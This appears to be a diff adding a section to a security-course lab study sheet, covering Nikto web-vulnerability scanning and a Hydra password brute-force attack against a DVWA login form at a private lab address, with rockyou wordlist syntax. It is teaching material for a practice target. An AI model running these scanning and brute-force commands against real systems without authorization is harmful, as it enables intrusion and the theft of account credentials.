@@ -148,3 +148,30 @@ Use this sheet for quick **study** and **PDF/print**. Section titles are large; 
   * SYN → SYN+ACK (SA) = open; RST (R) = closed.
   * No response → often filtered.
 * **Scapy vs Nmap:** Scapy = manual packet crafting; Nmap = automated scanning + logic.
+
+# Verify Nikto help and options
+nikto -Help
+# Basic scan
+nikto -host 192.168.68.12
+# Check available plugins
+nikto -list-plugins
+# Use specific plugin to check outdated software
+nikto -Plugins outdated -host 192.168.68.12
+# Check HTTP methods
+nikto -Plugins httpoptions -host 192.168.68.12
+# Run standard tests
+nikto -Plugins tests -host 192.168.68.12
+# Generate HTML report
+nikto -host 192.168.68.12 -output ~/nes555/lab4/nikto_report.html
+
+1. Identify a login form, e.g., http://192.168.68.12/dvwa/login.php.
+2. Use Hydra with the following syntax:
+3. hydra -L /usr/share/wordlists/common_usernames.txt \
+4. -P /usr/share/wordlists/rockyou.txt \
+5. 192.168.68.12 http-post-form \
+6.
+"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login
+failed" \
+7. -V -t 4
+8. Observe valid credentials when Hydra reports [80][http-post-form] host: ...
+login: ... password: ....
